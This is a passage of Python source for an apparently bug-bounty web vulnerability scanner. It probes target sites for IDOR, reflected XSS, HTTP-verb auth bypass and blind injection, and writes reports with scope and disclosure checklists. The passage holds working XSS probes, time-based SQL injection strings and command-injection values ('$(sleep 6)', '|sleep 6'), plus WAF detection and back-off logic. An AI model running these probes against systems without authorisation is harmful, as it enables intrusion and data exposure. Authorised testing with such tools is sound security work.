# =============================================================================
# Per-host session state (only for manual credentials)
# =============================================================================
_state_lock = threading.Lock()
_host_state: Dict[str, Dict[str, Any]] = {}

def _host_of(url: str) -> str:
    try:
        h = urllib.parse.urlparse(url).hostname or ""
        return h.lower()
    except Exception:
        return ""

def _get_state(host: str) -> Dict[str, Any]:
    with _state_lock:
        if host not in _host_state:
            _host_state[host] = {"cookies": {}, "jwt": None, "api_key": None}
        return _host_state[host]

def set_session_cookie_for_host(host: str, cookie_str: str):
    if not host:
        return
    try:
        cookie = SimpleCookie()
        cookie.load(cookie_str)
        state = _get_state(host)
        for key, morsel in cookie.items():
            state["cookies"][key] = morsel.value
            print(f"[DEBUG] {host} cookie set: {key}={morsel.value[:20]}...")
    except Exception as e:
        print(f"[DEBUG] cookie parse failed for {host}: {e}")

def _auth_headers_for_host(host: str) -> dict:
    state = _get_state(host)
    h = {}
    if state["cookies"]:
        h["Cookie"] = "; ".join(f"{k}={v}" for k, v in state["cookies"].items())
    if state["jwt"]:
        h["Authorization"] = f"Bearer {state['jwt']}"
    if state["api_key"]:
        h["X-API-Key"] = state["api_key"]
    return h

# Dual-platform reproduction helper (PowerShell + curl)
# =============================================================================
def _ps_quote(s: str) -> str:
    return s.replace("'", "''")

def _sh_quote(s: str) -> str:
    return s.replace("'", "'\\''")

def dual_repro(method: str, url: str, headers: Optional[dict] = None,
               body: Optional[str] = None, follow_redirects: bool = False) -> Dict[str, str]:
    h = _get_headers()
    if headers:
        h.update(headers)
    method = method.upper()

    # PowerShell
    ps_lines = ["$h = @{"]
    for k, v in h.items():
        ps_lines.append(f"  '{_ps_quote(k)}' = '{_ps_quote(str(v))}'")
    ps_lines.append("}")
    ps_cmd = f"Invoke-WebRequest -Uri '{_ps_quote(url)}' -Method {method} -Headers $h -SkipHttpErrorCheck"
    if not follow_redirects:
        ps_cmd += " -MaximumRedirection 0"
    if body is not None:
        ps_lines.append(f"$b = '{_ps_quote(body)}'")
        ps_cmd += " -Body $b"
    ps_lines.append(ps_cmd)
    ps_lines.append("$resp.StatusCode; $resp.Headers; $resp.Content")
    ps = "\n".join(ps_lines)

    # curl
    curl_parts = ["curl -sSi"]
    if not follow_redirects:
        curl_parts.append("--max-redirs 0")
    curl_parts.append(f"-X {method}")
    for k, v in h.items():
        curl_parts.append(f"-H '{_sh_quote(k)}: {_sh_quote(str(v))}'")
    if body is not None:
        curl_parts.append(f"--data-raw '{_sh_quote(body)}'")
    curl_parts.append(f"'{_sh_quote(url)}'")
    curl = " \\\n  ".join(curl_parts)

    return {"powershell": ps, "curl": curl}

def detect_waf(resp: dict) -> Optional[str]:
    hdrs = resp.get("headers", {}) or {}
    body = (resp.get("body") or "")[:4000].lower()
    hdr_blob = " ".join(f"{k}:{v}" for k, v in hdrs.items()).lower()
    blob = hdr_blob + " " + body
    for waf, sigs in WAF_SIGNATURES.items():
        if any(s in blob for s in sigs):
            return waf
    return None

def _build_ctx(insecure: bool = False):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx

def http_request_raw(url: str, method: str = "GET", headers: Optional[dict] = None,
                     data: Optional[bytes] = None, timeout: int = TIMEOUT,
                     follow_redirects: bool = False, insecure: bool = False) -> dict:
    host = _host_of(url)
    if headers is None:
        headers = {}
    # Apply global extra headers (User-Agent, custom)
    global_headers = _get_headers()
    for k, v in global_headers.items():
        headers.setdefault(k, v)
    # Per-host auth headers
    for k, v in _auth_headers_for_host(host).items():
        headers.setdefault(k, v)

    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    ctx = _build_ctx(insecure)

    # Build opener with HTTPS handler
    https_handler = urllib.request.HTTPSHandler(context=ctx)
    if not follow_redirects:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None
        opener = urllib.request.build_opener(NoRedirect, https_handler)
    else:
        opener = urllib.request.build_opener(https_handler)

    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read(MAX_BODY)
            body = raw.decode('utf-8', errors='ignore')
            set_cookie = resp.headers.get("Set-Cookie")
            if set_cookie:
                set_session_cookie_for_host(host, set_cookie)
            # JWT capture only from auth endpoints
            auth_like = any(k in url.lower() for k in ("/login", "/auth", "/token", "/oauth", "/session", "/signin"))
            if auth_like:
                try:
                    j = json.loads(body)
                    if isinstance(j, dict):
                        tok = (j.get("access_token") or j.get("token") or j.get("jwt") or j.get("id_token") or (j.get("data") or {}).get("token"))
                        if isinstance(tok, str) and re.match(r'^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$', tok):
                            _get_state(host)["jwt"] = tok
                            print(f"[DEBUG] {host} JWT captured: {tok[:30]}...")
                except Exception:
                    pass
            api_key_header = resp.headers.get("X-API-Key") or resp.headers.get("Api-Key")
            if api_key_header:
                _get_state(host)["api_key"] = api_key_header
                print(f"[DEBUG] {host} API Key captured: {api_key_header[:20]}...")
            return {"status": resp.status, "headers": dict(resp.headers), "body": body, "url": resp.url}
    except urllib.error.HTTPError as e:
        try:
            body = e.read(MAX_BODY).decode('utf-8', errors='ignore') if e.fp else ""
        except Exception:
            body = ""
        return {"status": e.code, "headers": dict(e.headers or {}), "body": body, "url": url}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": "", "url": url, "error": str(e)}

def http_request_with_fallback(url: str, method: str = "GET", headers: Optional[dict] = None,
                               data: Optional[bytes] = None, max_retries: int = 2, delay: int = 5,
                               **kwargs) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    resp = http_request_raw(url, method, headers, data, **kwargs)
    if resp["status"] != 0:
        return resp
    if url.startswith("https://"):
        http_url = url.replace("https://", "http://", 1)
        print(f"[*] HTTPS failed, trying HTTP: {http_url}")
        resp2 = http_request_raw(http_url, method, headers, data, **kwargs)
        if resp2["status"] != 0:
            return resp2
    return resp

def http_request_with_retry(url: str, method: str = "GET", headers: Optional[dict] = None,
                            data: Optional[bytes] = None, max_retries: int = 3, delay: int = 5,
                            **kwargs) -> dict:
    last = None
    for attempt in range(max_retries):
        resp = http_request_with_fallback(url, method, headers, data, max_retries=1, **kwargs)
        last = resp
        if resp["status"] == 0:
            print(f"[*] Connection error: {resp.get('error','?')}, retry in {delay}s ({attempt+1}/{max_retries})")
            time.sleep(delay)
            continue
        if resp["status"] in (502, 503, 504):
            print(f"[*] {resp['status']} retry in {delay}s ({attempt+1}/{max_retries})")
            time.sleep(delay)
            continue
        if resp["status"] in (403, 429):
            waf = detect_waf(resp)
            if waf:
                wait = min(120, 5 * (2 ** attempt))
                print(f"[!] {waf} block detected (HTTP {resp['status']}), backing off {wait}s ({attempt+1}/{max_retries})")
                time.sleep(wait)
                continue
        return resp
    return last or {"status": 0, "headers": {}, "body": "", "url": url}

def http_request(url: str, method: str = "GET", headers: Optional[dict] = None,
                 data: Optional[bytes] = None, timeout: int = TIMEOUT,
                 follow_redirects: bool = False, insecure: bool = False) -> dict:
    return http_request_with_retry(url, method, headers, data, max_retries=2, delay=3,
                                   timeout=timeout, follow_redirects=follow_redirects,
                                   insecure=insecure)

def crtsh_subdomains(domain: str) -> List[str]:
    found = set()
    url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
    print(f"[*] Querying crt.sh CT logs for {domain}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        ctx = _build_ctx(False)
        with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
            data = json.loads(r.read(MAX_BODY))
        for entry in data:
            for name in (entry.get("name_value", "") or "").splitlines():
                name = name.strip().lower().lstrip("*.")
                if name and name.endswith(domain) and "@" not in name and " " not in name:
                    found.add(name)
        print(f"    crt.sh found {len(found)} subdomains")
    except Exception as e:
        print(f"[!] crt.sh lookup failed: {e}")
    return sorted(found)

def resolve_cname(host: str) -> Optional[str]:
    try:
        url = f"https://cloudflare-dns.com/dns-query?name={urllib.parse.quote(host)}&type=CNAME"
        req = urllib.request.Request(url, headers={"Accept": "application/dns-json", "User-Agent": "Mozilla/5.0"})
        ctx = _build_ctx(False)
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            j = json.loads(r.read(65536))
        for ans in j.get("Answer", []) or []:
            if ans.get("type") == 5:
                return (ans.get("data") or "").rstrip(".")
    except Exception:
        pass
    return None

def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    from collections import Counter
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values() if c)

def scan_code(file_path: str) -> List[dict]:
    findings = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception:
        return findings

    for name, pattern in CREDENTIAL_PATTERNS.items():
        for m in re.finditer(pattern, content):
            val = m.group(0)
            ctx_start, ctx_end = max(0, m.start() - 80), min(len(content), m.end() + 80)
            ctx_str = content[ctx_start:ctx_end]
            findings.append({
                "type": "static_secret",
                "title": f"Hardcoded {name}",
                "severity": "CRITICAL" if name in ("GCP Service Account JSON", "RSA/EC Private Key", "Stripe Live Key") else "HIGH",
                "cwe": "CWE-798", "owasp": "A07:2021",
                "file": file_path,
                "evidence": f"Match: {val[:120]}\nContext: ...{ctx_str}...",
                "remediation": "Rotate the secret immediately; remove from VCS history; store in a secrets manager.",
                "repro_ps":    f"Select-String -Path '{file_path}' -Pattern '{val[:20]}'",
                "repro_curl":  f"grep -rn '{val[:20]}' '{file_path}'",
                "needs_manual_verification": True,
            })

    # High-entropy tokens
    for line_num, line in enumerate(content.splitlines(), 1):
        for tok in re.findall(r'[A-Za-z0-9+/=_\-]{32,}', line):
            if tok.startswith(("http://", "https://")) or any(re.search(p, tok) for p in CREDENTIAL_PATTERNS.values()):
                continue
            if shannon_entropy(tok) > 4.5 and len(tok) < 200:
                findings.append({
                    "type": "static_entropy",
                    "title": "High-entropy string (possible unknown secret)",
                    "severity": "LOW", "cwe": "CWE-798", "owasp": "A07:2021",
                    "file": file_path,
                    "evidence": f"Line {line_num}: {line[:200]}\nToken: {tok[:120]}",
                    "remediation": "Manually verify whether this is a secret; if so, rotate.",
                    "repro_ps":   f"Get-Content '{file_path}' | Select-String -Pattern '{tok[:16]}'",
                    "repro_curl": f"grep -n '{tok[:16]}' '{file_path}'",
                    "needs_manual_verification": True,
                })

    for rule in STATIC_RULES:
        for m in re.finditer(rule["pattern"], content, re.IGNORECASE):
            s, e = max(0, m.start() - 80), min(len(content), m.end() + 80)
            line_start = content.count("\n", 0, s) + 1
            line_end = content.count("\n", 0, e) + 1
            findings.append({
                "type": "static_logic",
                "title": rule["name"],
                "severity": rule["severity"],
                "cwe": rule["cwe"], "owasp": rule["owasp"],
                "file": file_path,
                "evidence": f"Lines {line_start}-{line_end}:\n{content[s:e]}",
                "remediation": f"Remediate {rule['name']} per OWASP/CWE guidance.",
                "repro_ps":   f"Get-Content '{file_path}' | Select-Object -Skip {max(0,line_start-2)} -First 5",
                "repro_curl": f"sed -n '{max(1,line_start-2)},{line_end+2}p' '{file_path}'",
                "needs_manual_verification": True,
            })
    return findings

def test_idor(url: str, param: str, base_id: str = "1") -> List[dict]:
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    if param not in qs:
        return findings
    current = qs[param][0]
    if not current.isdigit():
        return findings

    our_resp = http_request(url)
    if our_resp["status"] != 200:
        return findings
    our_body = our_resp.get("body", "")
    our_emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', our_body))

    for offset in (-1, 1, 100, 999):
        test_id = str(int(current) + offset)
        if test_id == current or int(test_id) < 0:
            continue
        qs_copy = dict(qs)
        qs_copy[param] = [test_id]
        new_query = urllib.parse.urlencode(qs_copy, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        resp = http_request(test_url)
        if resp["status"] != 200 or len(resp.get("body", "")) < 100:
            continue
        resp_body = resp.get("body", "")
        if resp_body == our_body:
            continue
        other_emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', resp_body))
        new_emails = other_emails - our_emails
        id_echoed = (f'"id":{test_id}' in resp_body
                     or f'"id":"{test_id}"' in resp_body
                     or f'"user_id":{test_id}' in resp_body)
        if new_emails or id_echoed:
            repro = dual_repro("GET", test_url)
            findings.append({
                "type": "idor",
                "title": "IDOR — Spoofed ID returns different user's data",
                "severity": "HIGH", "cwe": "CWE-639", "owasp": "A01:2021", "url": test_url,
                "parameter": param, "original_id": current, "tested_id": test_id,
                "evidence": f"New emails vs baseline: {list(new_emails)[:3]}\n"
                            f"ID echoed for spoofed value: {id_echoed}\n\n"
                            f"{resp_body[:1500]}",
                "remediation": "Object-level authorization tied to the session user, not to "
                               "a request-supplied ID.",
                "repro_ps":   f"# Baseline:\n{dual_repro('GET', url)['powershell']}\n"
                              f"# Spoofed:\n{repro['powershell']}",
                "repro_curl": f"# Baseline:\n{dual_repro('GET', url)['curl']}\n"
                              f"# Spoofed:\n{repro['curl']}",
                "needs_manual_verification": False,
            })
            break
    return findings

def test_xss(url: str, param: str) -> List[dict]:
    findings = []
    marker = f"xss{int(time.time())}"
    probes = [
        f'<svg/onload=/*{marker}*/>',
        f'"><img src=x onerror={marker}>',
        f"';{marker};//",
    ]
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    if param not in qs:
        return findings
    for probe in probes:
        qs_copy = dict(qs)
        qs_copy[param] = [probe]
        test_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(qs_copy, doseq=True)))
        resp = http_request(test_url)
        if resp["status"] != 200:
            continue
        body = resp.get("body", "")
        if probe not in body:
            continue
        # Reject encoded-only reflection
        encoded_variants = [
            probe.replace("<", "&lt;").replace(">", "&gt;"),
            probe.replace("<", "\\u003c").replace(">", "\\u003e"),
            probe.replace('"', "&quot;"),
            probe.replace("'", "&#39;"),
        ]
        encoded_present = any(v in body for v in encoded_variants if v != probe)
        raw_still_present = body.count(probe) > (body.count(encoded_variants[0]) if encoded_variants else 0)
        if encoded_present and not raw_still_present:
            continue
        idx = body.find(probe)
        repro = dual_repro("GET", test_url)
        findings.append({
            "type": "xss", "title": "Reflected XSS (unencoded raw reflection)",
            "severity": "MEDIUM", "cwe": "CWE-79", "owasp": "A03:2021",
            "url": test_url, "parameter": param, "payload": probe,
            "evidence": f"Raw probe reflected without encoding at offset {idx}:\n"
                        f"...{body[max(0,idx-150):idx+len(probe)+150]}...",
            "remediation": "Context-aware output encoding; CSP; HTML template auto-escape.",
            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
            "needs_manual_verification": False,
        })
        break
    return findings

def method_enumeration(url: str) -> List[dict]:
    findings = []
    base = http_request(url, method="GET")
    if base["status"] == 0:
        return findings
    for method in ("PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "PROPFIND"):
        data = b'{}' if method in ("PUT", "PATCH") else None
        hdrs = {"Content-Type": "application/json"} if method in ("PUT", "PATCH") else None
        resp = http_request(url, method=method, data=data, headers=hdrs)
        if method == "OPTIONS" and resp["status"] == 200:
            allow = (resp.get("headers", {}).get("Allow", "")
                     or resp.get("headers", {}).get("allow", ""))
            if any(v in allow for v in ("PUT", "DELETE", "PATCH")):
                repro = dual_repro("OPTIONS", url)
                findings.append({
                    "type": "verb_enum",
                    "title": f"Write methods advertised via OPTIONS: {allow}",
                    "severity": "LOW", "cwe": "CWE-650", "owasp": "A05:2021", "url": url,
                    "evidence": f"Allow: {allow}",
                    "remediation": "Disable unused verbs at the web layer.",
                    "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
                    "needs_manual_verification": True,
                })
        elif method == "TRACE" and resp["status"] == 200 and "TRACE" in resp.get("body", ""):
            repro = dual_repro("TRACE", url)
            findings.append({
                "type": "xst", "title": "HTTP TRACE Enabled (Cross-Site Tracing)",
                "severity": "LOW", "cwe": "CWE-693", "owasp": "A05:2021", "url": url,
                "evidence": resp["body"][:800],
                "remediation": "Disable TRACE method at web server.",
                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
                "needs_manual_verification": False,
            })
        elif (method in ("PUT", "DELETE", "PATCH")
              and resp["status"] in (200, 201, 204)
              and base["status"] in (401, 403)):
            repro = dual_repro(method, url, hdrs, '{}' if data else None)
            findings.append({
                "type": "verb_auth_bypass",
                "title": f"Auth bypass: {method} succeeds where GET is {base['status']}",
                "severity": "CRITICAL", "cwe": "CWE-284", "owasp": "A01:2021", "url": url,
                "evidence": f"GET -> {base['status']}, {method} -> {resp['status']}\n\n"
                            f"{resp['body'][:1500]}",
                "remediation": "Apply authentication/authorization uniformly across all HTTP methods.",
                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
                "needs_manual_verification": False,
            })
    return findings

def timing_based_tests(url: str, param: str) -> List[dict]:
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    if param not in qs:
        return findings
    baseline = []
    for _ in range(3):
        t = time.time()
        http_request(url, timeout=20)
        baseline.append(time.time() - t)
    base_avg = sum(baseline) / len(baseline)
    time_payloads = [
        ("1' AND SLEEP(6)-- -",              "MySQL time-based SQLi",    "CWE-89"),
        ("1); WAITFOR DELAY '0:0:6'-- -",    "MSSQL time-based SQLi",    "CWE-89"),
        ("1' AND pg_sleep(6)-- -",           "PostgreSQL time-based SQLi","CWE-89"),
        ("1' AND 1=(SELECT 1 FROM PG_SLEEP(6))-- -", "PostgreSQL subquery SQLi","CWE-89"),
        ("$(sleep 6)",                       "OS command injection",     "CWE-78"),
        ("`sleep 6`",                        "OS command injection",     "CWE-78"),
        ("|sleep 6",                         "OS command injection",     "CWE-78"),
    ]
    for payload, label, cwe in time_payloads:
        qs_copy = dict(qs)
        qs_copy[param] = [payload]
        test_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(qs_copy, doseq=True)))
        t = time.time()
        resp = http_request(test_url, timeout=25)
        delta = time.time() - t
        if delta > base_avg + 5 and resp["status"] != 0:
            t2 = time.time()
            http_request(test_url, timeout=25)
            delta2 = time.time() - t2
            if delta2 > base_avg + 5:
                repro = dual_repro("GET", test_url)
                findings.append({
                    "type": "blind_injection",
                    "title": f"Time-based injection: {label}",
                    "severity": "HIGH", "cwe": cwe, "owasp": "A03:2021",
                    "url": test_url, "parameter": param, "payload": payload,
                    "evidence": f"Baseline avg: {base_avg:.2f}s\n"
                                f"Payload attempt 1: {delta:.2f}s\n"
                                f"Payload attempt 2: {delta2:.2f}s\n"
                                f"(Both > baseline + 5s, indicating server-side sleep executed.)",
                    "remediation": "Parameterize queries; avoid shell interpolation; sanitize input.",
                    "repro_ps":   f"Measure-Command {{ {repro['powershell']} }}",
                    "repro_curl": f"time {repro['curl']}",
                    "needs_manual_verification": False,
                })
                return findings
    return findings

def scan_target(base_domains: List[str], args) -> List[dict]:
    all_findings: List[dict] = []
    prefixes = ["", "api", "v1", "v2", "v3", "v4", "rest", "graphql"]
    nouns = [
        "users", "accounts", "orders", "positions", "portfolios", "instruments",
        "quotes", "watchlists", "markets", "fundamentals", "dividends", "documents",
        "ach", "options", "crypto", "transfers", "relationships", "trading",
        "profile", "settings", "config", "admin", "metrics", "health", "status",
        "version", "login", "logout", "signup", "register", "reset", "change",
        "forgot", "me", "search", "files", "messages", "notifications",
    ]
    api_paths = []
    for p in prefixes:
        for n in nouns:
            api_paths.append(f"/{p}/{n}" if p else f"/{n}")
    api_paths += [
        "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
        "/api-docs", "/graphql", "/query", "/.well-known/jwks.json",
        "/actuator/health", "/actuator/info", "/reset-password",
        "/change-password", "/forgot-password", "/sitemap.xml", "/robots.txt",
    ]

    for base in base_domains:
        if not base.startswith("http"):
            base = "https://" + base

        print(f"[*] === Scanning {base} ===")
        print(f"[*] Warming up {base}...")
        warm = http_request(base, method="HEAD")
        waf = detect_waf(warm)
        if waf:
            print(f"[!] WAF detected on {base}: {waf} — adjusting pacing")

        # Manual authentication only – no auto-auth
        if args.username and args.password:
            # Manual login would go here (not implemented)
            pass

        # Per-host probes
        print(f"[*] Global probes for {base}")
        all_findings.extend(cors_misconfiguration(base))
        all_findings.extend(subdomain_takeover(base))
        all_findings.extend(host_header_injection(base))
        all_findings.extend(http_smuggling_test(base))
        all_findings.extend(exposed_config_check(base))

        # Path-by-path
        for path in api_paths:
            url = base.rstrip("/") + path
            time.sleep(REQUEST_DELAY)
            resp = http_request(url)
            print(f"[DEBUG] {url} -> {resp['status']} ({len(resp.get('body',''))} bytes)")

            if resp["status"] not in (200, 401, 403):
                continue

            content_type = (resp.get("headers", {}).get("Content-Type", "")
                            or resp.get("headers", {}).get("content-type", "")).lower()
            is_html = ("text/html" in content_type
                       or ("text/plain" in content_type and "<html" in resp["body"][:1000].lower()))

            # Flag unauth API exposure only for real API responses
            if (resp["status"] == 200 and not is_html
                    and not any(w in resp["body"].lower()
                                for w in ("unauthorized", "please log in", "login required"))):
                repro = dual_repro("GET", url)
                all_findings.append({
                    "type": "api_no_auth",
                    "title": "API Endpoint Accessible Without Authentication",
                    "severity": "HIGH", "cwe": "CWE-862", "owasp": "A01:2021", "url": url,
                    "evidence": f"GET {url} -> {resp['status']}\n"
                                f"Content-Type: {content_type}\n\n{resp['body'][:1500]}",
                    "remediation": "Require authentication / authorization for this endpoint.",
                    "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
                    "needs_manual_verification": True,
                })

            # Method enumeration on 200/401/403 (verb tampering)
            all_findings.extend(method_enumeration(url))

            # Only run vuln tests on 200 (don't waste on auth walls)
            if resp["status"] != 200:
                continue

            # Parameter-driven tests
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            for param in qs.keys():
                value = qs[param][0]
                all_findings.extend(test_sql_injection(url, param, value))
                if value.isdigit():
                    all_findings.extend(test_idor(url, param, value))
                all_findings.extend(test_xss(url, param))
                all_findings.extend(test_path_traversal(url, param))
                all_findings.extend(timing_based_tests(url, param))
                if any(k in param.lower() for k in ("url","uri","link","src","dest","redirect","callback")):
                    all_findings.extend(test_ssrf(url, param))

            # GraphQL introspection
            all_findings.extend(test_graphql_introspection(url))

            # Advanced zero-day modules
            all_findings.extend(advanced_deserialization_checks(url))
            all_findings.extend(advanced_graphql_batch_checks(url))
            all_findings.extend(advanced_prototype_pollution(url))
            all_findings.extend(race_condition_test(url, "POST"))
            all_findings.extend(cache_poisoning_test(url))
            all_findings.extend(xxe_injection(url))
            all_findings.extend(ldap_injection_advanced(url))
            all_findings.extend(crlf_injection(url))
            all_findings.extend(open_redirect(url))
            all_findings.extend(business_logic_bypass(url))
            all_findings.extend(parameter_pollution(url))
            all_findings.extend(email_header_injection(url))

            # JWT checks if response contains a JWT
            if re.search(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
                         resp.get("body", "")):
                all_findings.extend(advanced_jwt_checks(url, resp["body"]))

    return all_findings

# GitHub repo download (with token auth)
# =============================================================================
def fetch_github_repo(org_repo: str, out_dir: str) -> Optional[str]:
    print(f"[*] Downloading {org_repo} from GitHub...")
    api_url = f"https://api.github.com/repos/{org_repo}/zipball"
    headers = {}  # will add required header and possibly token
    gh_token = os.environ.get("GITHUB_TOKEN")
    if gh_token:
        headers["Authorization"] = f"token {gh_token}"
        print("[*] Using GITHUB_TOKEN for auth (5000/hr rate limit)")
    else:
        print("[!] No GITHUB_TOKEN set — unauth rate limit is 60/hr. "
              "Set $env:GITHUB_TOKEN (PowerShell) or export GITHUB_TOKEN (bash) to raise it.")
    req = urllib.request.Request(api_url, headers=headers)
    # Add the researcher header as well
    req.add_header("X-HackerOne-Research", RESEARCHER)
    ctx = _build_ctx(False)
    try:
        with urllib.request.urlopen(req, timeout=60, context=ctx) as resp:
            data = resp.read()
        zip_path = os.path.join(out_dir, "repo.zip")
        with open(zip_path, "wb") as f:
            f.write(data)
        extract_dir = os.path.join(out_dir, "repo")
        os.makedirs(extract_dir, exist_ok=True)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)
        subdirs = [d for d in os.listdir(extract_dir)
                   if os.path.isdir(os.path.join(extract_dir, d))]
        return os.path.join(extract_dir, subdirs[0]) if subdirs else extract_dir
    except Exception as e:
        print(f"    Error: {e}")
        return None

def _sev_rank(sev: str) -> int:
    return {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}.get(sev, 4)

def generate_report(findings: List[dict], target: str, out_dir: str):
    reports_dir = os.path.join(out_dir, "reports")
    os.makedirs(reports_dir, exist_ok=True)

    findings_sorted = sorted(findings, key=lambda f: _sev_rank(f.get("severity", "LOW")))

    for i, f in enumerate(findings_sorted, 1):
        safe = re.sub(r'[^a-zA-Z0-9]', '_', f.get('title', 'finding'))[:60]
        fname = f"{i:03d}_{safe}.md"
        needs_manual = f.get("needs_manual_verification", True)

        with open(os.path.join(reports_dir, fname), "w", encoding="utf-8") as out:
            out.write(f"# {f.get('title')}\n\n")
            out.write(f"**Researcher:** {RESEARCHER} (HackerOne)  \n")
            out.write(f"**Contact:** isiahjones@mail.com  \n")
            out.write(f"**Run marker (in every request header):** `{RUN_MARKER}`  \n")
            out.write(f"**Severity:** {f.get('severity')}  \n")
            out.write(f"**CWE:** {f.get('cwe')}  /  **OWASP:** {f.get('owasp')}  \n")
            out.write(f"**Target:** `{target}`  \n")
            out.write(f"**Asset:** `{f.get('url', f.get('file','N/A'))}`  \n")
            out.write(f"**Detected (UTC):** {dt.datetime.utcnow().isoformat()}Z  \n\n")

            if needs_manual:
                out.write("> ⚠️ **VERIFICATION REQUIRED** — automated detection only.\n"
                          "> Do NOT submit this report to the program until ALL checkboxes below\n"
                          "> are completed AND this banner is removed.\n\n")

            out.write("## Summary\n")
            out.write(f.get('description',
                      f"Automated detection flagged **{f.get('title')}** on the asset above. "
                      "See Evidence and complete manual verification below before submitting.\n") + "\n\n")

            out.write("## Reproduction — PowerShell (Windows)\n")
            out.write("```powershell\n")
            out.write(f.get("repro_ps", "# reproduction missing") + "\n")
            out.write("```\n\n")

            out.write("## Reproduction — curl (Linux / macOS / WSL)\n")
            out.write("```bash\n")
            out.write(f.get("repro_curl", "# reproduction missing") + "\n")
            out.write("```\n\n")

            out.write("## Raw Evidence Captured\n")
            out.write("```\n")
            ev = f.get('evidence', 'MISSING')
            out.write((ev[:3500] + "\n...(truncated)" if len(ev) > 3500 else ev) + "\n")
            out.write("```\n\n")

            out.write("## Impact — FILL BEFORE SUBMIT\n")
            out.write("- [ ] What can attacker do now that they couldn't before (concrete actions)?\n")
            out.write("- [ ] Data classes affected (PII / financial / credentials / source / other)?\n")
            out.write("- [ ] User count impact (bounded estimate with reasoning)?\n")
            out.write("- [ ] Pre-conditions (auth required? specific role? browser? timing?)?\n")
            out.write("- [ ] Chainability — does this unlock a higher-severity attack?\n\n")

            out.write("## Remediation\n")
            out.write(f.get('remediation', 'Follow OWASP guidance for this CWE.') + "\n\n")

            out.write("## Dupe & Scope Check — FILL BEFORE SUBMIT\n")
            out.write("- [ ] Searched program hacktivity for this class on this target\n")
            out.write("- [ ] Verified asset is IN-SCOPE per current program page\n")
            out.write("- [ ] Verified this class is not explicitly OUT-OF-SCOPE for the program\n")
            out.write("- [ ] Not on program's published 'known issues / do not report' list\n")
            out.write("- [ ] Not self-exploitation / not theoretical-only\n\n")

            out.write("## Disclosure & Legal\n")
            out.write("- [ ] All testing stayed within program scope and rate limits\n")
            out.write("- [ ] No third-party user data was retained beyond PoC demonstration\n")
            out.write("- [ ] PoC data has been deleted from my systems\n")
            out.write("- [ ] I will not publicly disclose until the program authorizes disclosure\n\n")

            out.write("---\n")
            out.write(f"*Generated by deephunterv3.1 at {dt.datetime.utcnow().isoformat()}Z*\n")

    # SUMMARY.md
    counts = {sev: len([x for x in findings_sorted if x.get('severity') == sev])
              for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW")}
    manual_count = len([x for x in findings_sorted if x.get("needs_manual_verification")])

    with open(os.path.join(out_dir, "SUMMARY.md"), "w", encoding="utf-8") as f:
        f.write(f"# deephunterv3.1 — Scan Summary\n\n")
        f.write(f"**Target:** {target}  \n")
        f.write(f"**Run marker:** `{RUN_MARKER}`  \n")
        f.write(f"**Scanned (UTC):** {dt.datetime.utcnow().isoformat()}Z  \n")
        f.write(f"**Total findings (pre-verification):** {len(findings_sorted)}  \n")
        f.write(f"**Require manual verification:** {manual_count}  \n\n")
        f.write("## Findings by Severity\n\n")
        f.write("| Severity | Count |\n|---|---|\n")
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            f.write(f"| {sev} | {counts[sev]} |\n")
        f.write("\n## Findings Index\n\n")
        for i, fd in enumerate(findings_sorted, 1):
            safe = re.sub(r'[^a-zA-Z0-9]', '_', fd.get('title', 'finding'))[:60]
            marker = " ⚠️" if fd.get("needs_manual_verification") else ""
            f.write(f"{i}. **[{fd.get('severity')}]** {fd.get('title')}{marker}  \n")
            f.write(f"   Asset: `{fd.get('url', fd.get('file','N/A'))}`  \n")
            f.write(f"   Report: `reports/{i:03d}_{safe}.md`\n\n")
        f.write("\n---\n\n")
        f.write("⚠️ = requires manual verification before submitting to bounty program.\n")

def main():
    parser = argparse.ArgumentParser(
        description="deephunterv3.1 — cross-platform bug bounty scanner (pure Python stdlib)")
    parser.add_argument("-d", "--domain", required=True,
                        help="Target domain (example.com) or github org/repo (org/repo)")
    parser.add_argument("--web-domains", help="Comma-separated domains to scan (wildcard like *.example.com)")
    parser.add_argument("-u", "--username", help="Manual username (not implemented – placeholder)")
